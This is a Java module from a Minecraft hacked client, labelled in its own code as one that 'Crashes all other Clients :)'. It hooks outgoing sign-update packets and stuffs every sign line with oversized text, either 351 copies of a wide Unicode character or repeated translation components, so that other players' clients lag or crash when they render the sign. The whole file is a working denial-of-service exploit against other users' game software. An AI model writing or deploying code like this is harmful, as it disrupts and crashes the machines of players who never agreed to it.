package com.skillclient.modules.misc;

import com.skillclient.events.api.EventTarget;
import net.minecraft.util.IChatComponent;
import net.minecraft.util.ChatComponentTranslation;
import net.minecraft.util.ChatComponentText;
import net.minecraft.network.play.client.C12PacketUpdateSign;
import com.skillclient.events.EventPacketSend;
import com.skillclient.main.Register;
import com.skillclient.misc.ValueBoolean;
import com.skillclient.misc.Module;

public class LaggSign extends Module
{
    ValueBoolean new_;
    
    public LaggSign() {
        super("LaggSign", Register.Category.MISC, "Crashes all other Clients :)");
        this.new_ = new ValueBoolean("New", (Module)this, false);
    }
    
    @EventTarget
    public void onSend(final EventPacketSend event) {
        if (event.getPacket() instanceof C12PacketUpdateSign) {
            IChatComponent send;
            if (this.new_.getValue()) {
                final StringBuilder sb = new StringBuilder();
                for (int m = 0; m <= 350; ++m) {
                    sb.append("\ufdfd");
                }
                send = (IChatComponent)new ChatComponentText(sb.toString());
            }
            else {
                final ChatComponentTranslation trans = new ChatComponentTranslation("options.snooper.desc", new Object[0]);
                send = (IChatComponent)new ChatComponentText("                           ");
                for (int i = 0; i < 8; ++i) {
                    send.appendSibling((IChatComponent)trans);
                }
            }
            for (int j = 0; j < 4; ++j) {
                ((C12PacketUpdateSign)event.getPacket()).getLines()[j].appendSibling(send);
            }
        }
    }
}

